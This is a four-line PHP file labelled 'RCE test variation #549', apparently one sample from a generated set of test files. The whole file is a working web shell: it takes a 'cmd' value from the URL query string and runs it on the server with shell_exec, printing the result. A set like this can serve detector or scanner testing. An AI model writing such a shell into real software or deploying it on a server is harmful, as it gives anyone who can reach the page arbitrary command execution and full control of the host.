<?php
// RCE test variation #549
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>